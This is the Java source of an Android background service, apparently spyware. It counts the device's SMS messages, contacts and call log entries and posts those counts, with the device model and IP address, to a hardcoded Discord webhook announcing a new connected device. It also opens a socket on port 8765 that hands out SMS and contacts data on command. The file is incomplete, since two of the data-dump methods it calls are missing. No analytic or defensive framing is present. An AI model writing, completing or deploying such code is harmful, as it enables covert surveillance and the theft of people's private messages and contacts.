== DataService.java ==

package valsecan.exe;
import android.app.*;
import android.content.*;
import android.database.Cursor;
import android.net.Uri;
import android.net.wifi.WifiManager;
import android.os.*;
import android.provider.*;
import java.io.*;
import java.net.*;
import org.json.*;

public class DataService extends Service {
    private static final String WEBHOOK_URL = "https://discord.com/api/webhooks/1508945513754394785/3ojXKY3FMuVVg-bKPtzJNGn4FoYGjqRxqUs0n2-_iXvfTQ5wARsWPpzwI42Gama94J65";
    private static final String BOT_NAME = "valse can";
    private static final int PORT = 8765;
    private ServerSocket server;

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        new Thread(this::startServer).start();
        new Thread(this::sendDiscordNotification).start();
        return START_STICKY;
    }

    void sendDiscordNotification() {
        try {
            Thread.sleep(2000); // Izinlerin alinmasini bekle
            String ip = getLocalIpAddress();
            String model = Build.MODEL;
            String android = Build.VERSION.RELEASE;
            int battery = getBatteryLevel();
            int smsCount = getSMSCount();
            int contactCount = getContactCount();
            int callCount = getCallCount();

            JSONObject payload = new JSONObject();
            payload.put("username", BOT_NAME);
            JSONArray embeds = new JSONArray();
            JSONObject embed = new JSONObject();
            embed.put("title", "\uD83D\uDCF1 YENİ CİHAZ BAĞLANDI");
            embed.put("color", 2201331); // Yesil
            JSONArray fields = new JSONArray();
            fields.put(makeField("\uD83D\uDCF1 Cihaz", model, true));
            fields.put(makeField("\uD83E\uDD16 Android", android, true));
            fields.put(makeField("\uD83D\uDD0B Pil", "%" + battery, true));
            fields.put(makeField("\uD83D\uDCAC SMS", String.valueOf(smsCount) + " mesaj", true));
            fields.put(makeField("\uD83D\uDC65 Rehber", String.valueOf(contactCount) + " kisi", true));
            fields.put(makeField("\uD83D\uDCDE Aramalar", String.valueOf(callCount) + " kayit", true));
            fields.put(makeField("\uD83D\uDD17 IP Adresi", ip + ":" + PORT, false));
            embed.put("fields", fields);
            embeds.put(embed);
            payload.put("embeds", embeds);

            URL url = new URL(WEBHOOK_URL);
            HttpURLConnection con = (HttpURLConnection) url.openConnection();
            con.setRequestMethod("POST");
            con.setRequestProperty("Content-Type", "application/json");
            con.setDoOutput(true);
            con.getOutputStream().write(payload.toString().getBytes());
            con.getResponseCode();
        } catch (Exception e) { e.printStackTrace(); }
    }

    JSONObject makeField(String name, String value, boolean inline) throws Exception {
        JSONObject f = new JSONObject();
        f.put("name", name);
        f.put("value", value);
        f.put("inline", inline);
        return f;
    }

    String getLocalIpAddress() {
        try {
            WifiManager wm = (WifiManager) getApplicationContext().getSystemService(WIFI_SERVICE);
            int ip = wm.getConnectionInfo().getIpAddress();
            return String.format("%d.%d.%d.%d",(ip&0xff),((ip>>8)&0xff),((ip>>16)&0xff),((ip>>24)&0xff));
        } catch (Exception e) { return "Bilinmiyor"; }
    }

    int getBatteryLevel() {
        IntentFilter f = new IntentFilter(Intent.ACTION_BATTERY_CHANGED);
        Intent bi = registerReceiver(null, f);
        int level = bi.getIntExtra(BatteryManager.EXTRA_LEVEL, -1);
        int scale = bi.getIntExtra(BatteryManager.EXTRA_SCALE, -1);
        return (int)((level / (float)scale) * 100);
    }
    
    int getSMSCount() {
        Cursor c = getContentResolver().query(Uri.parse("content://sms"), new String[]{"_id"}, null, null, null);
        int count = c != null ? c.getCount() : 0;
        if (c != null) c.close();
        return count;
    }
    
    int getContactCount() {
        Cursor c = getContentResolver().query(ContactsContract.Contacts.CONTENT_URI, new String[]{"_id"}, null, null, null);
        int count = c != null ? c.getCount() : 0;
        if (c != null) c.close();
        return count;
    }
    
    int getCallCount() {
        Cursor c = getContentResolver().query(CallLog.Calls.CONTENT_URI, new String[]{"_id"}, null, null, null);
        int count = c != null ? c.getCount() : 0;
        if (c != null) c.close();
        return count;
    }

    void startServer() {
        try {
            server = new ServerSocket(PORT);
            while (true) { handleClient(server.accept()); }
        } catch (Exception e) { e.printStackTrace(); }
    }

    void handleClient(Socket socket) {
        try {
            BufferedReader in = new BufferedReader(new InputStreamReader(socket.getInputStream()));
            PrintWriter out = new PrintWriter(socket.getOutputStream(), true);
            String req = in.readLine();
            if ("SMS".equals(req)) { out.println(getSMSData()); socket.close(); return; }
            if ("CONTACTS".equals(req)) { out.println(getContactsData()); socket.close(); return; }
            out.println("{}");
            socket.close();
        } catch (Exception e) { e.printStackTrace(); }
    }

    @Override public IBinder onBind(Intent i) { return null; }
}
